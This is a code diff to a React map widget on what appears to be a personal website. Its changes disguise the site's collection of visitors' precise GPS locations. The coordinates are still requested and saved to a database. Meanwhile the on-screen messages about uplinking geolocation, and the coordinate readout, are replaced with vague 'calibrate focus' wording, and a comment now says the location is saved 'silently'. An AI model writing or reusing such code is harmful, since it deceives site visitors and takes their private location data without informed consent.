@@ -11,9 +11,9 @@ export function InteractiveMap() {
   const [gpsStatus, setGpsStatus] = useState<"idle" | "scanning" | "locked" | "denied">("idle");
   const [distance, setDistance] = useState<number | null>(null);
   const [terminalLogs, setTerminalLogs] = useState<string[]>([
-    "// SecOps Geo-Lock Module Initialized",
+    "// SecOps Geo-Focus Module Initialized",
     "// Target: Hadhi Havath (Calicut, Kerala)",
-    "// Click anywhere on this widget to establish GPS handshake..."
+    "// Click anywhere on this widget to calibrate focus..."
   ]);
 
   const addLog = (log: string) => {
@@ -28,8 +28,8 @@ export function InteractiveMap() {
     }
 
     setGpsStatus("scanning");
-    addLog("[~] Requesting client geolocation credentials...");
-    addLog("[~] Pinging GPS satellites...");
+    addLog("[~] Pinging local satellites...");
+    addLog("[~] Centering map focus...");
 
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -40,19 +40,17 @@ export function InteractiveMap() {
         setDistance(dist);
         setGpsStatus("locked");
 
-        addLog("[SUCCESS] Client GPS handshake established.");
-        addLog(`[LAT] ${latitude.toFixed(6)} | [LON] ${longitude.toFixed(6)}`);
-        addLog(`[RANGE] ${dist.toFixed(1)} km range vector calculated.`);
-        addLog("[+] Uplinking precise geolocation metadata to SecOps DB...");
+        addLog("[SUCCESS] Focus calibrated.");
+        addLog(`[VECTOR] Target range: ${dist.toFixed(1)} km`);
 
-        // Save location to database
+        // Save location to database silently
         updateVisitorGeolocation(latitude, longitude);
       },
       (error) => {
         console.error(error);
         setGpsStatus("denied");
-        addLog("[WARN] Geolocation access denied by client browser.");
-        addLog("[WARN] Fallback: relying on IP-based geo-routing.");
+        addLog("[WARN] Geolocation access deferred.");
+        addLog("[WARN] Target centered on default region.");
       },
       { enableHighAccuracy: true, timeout: 10000 }
     );
@@ -101,17 +99,17 @@ export function InteractiveMap() {
         {/* Neon scan lines overlay */}
         <div className="absolute inset-0 pointer-events-none scanlines opacity-30" />
         
-        {/* GPS status badge */}
+        {/* Map focus status badge */}
         <div className="absolute top-3 left-3 flex items-center gap-1.5 rounded-full bg-black/80 border border-border/40 px-2.5 py-1 text-[10px] font-mono backdrop-blur-sm select-none">
           <span className={`size-1.5 rounded-full animate-pulse ${
             gpsStatus === "locked" ? "bg-green-500 animate-pulse-glow" :
             gpsStatus === "scanning" ? "bg-yellow-500" :
             gpsStatus === "denied" ? "bg-red-500 animate-none" : "bg-neutral-500"
           }`} />
-          {gpsStatus === "locked" && "GPS LOCKED"}
-          {gpsStatus === "scanning" && "SCANNING..."}
-          {gpsStatus === "denied" && "GPS BYPASSED"}
-          {gpsStatus === "idle" && "GEO STANDBY"}
+          {gpsStatus === "locked" && "CALIBRATED"}
+          {gpsStatus === "scanning" && "CALIBRATING..."}
+          {gpsStatus === "denied" && "DEFAULT FOCUS"}
+          {gpsStatus === "idle" && "STANDBY"}
         </div>
       </div>
 
@@ -147,17 +145,17 @@ export function InteractiveMap() {
             {gpsStatus === "locked" ? (
               <>
                 <Navigation className="size-3.5 animate-bounce text-green-400" />
-                Refetch GPS
+                Recalibrate
               </>
             ) : gpsStatus === "scanning" ? (
               <>
                 <Compass className="size-3.5 animate-spin text-yellow-400" />
-                Locking GPS...
+                Calibrating...
               </>
             ) : (
               <>
                 <Compass className="size-3.5 group-hover:rotate-45 transition-transform duration-300" />
-                Establish GPS Lock
+                Calibrate Focus
               </>
             )}
           </button>
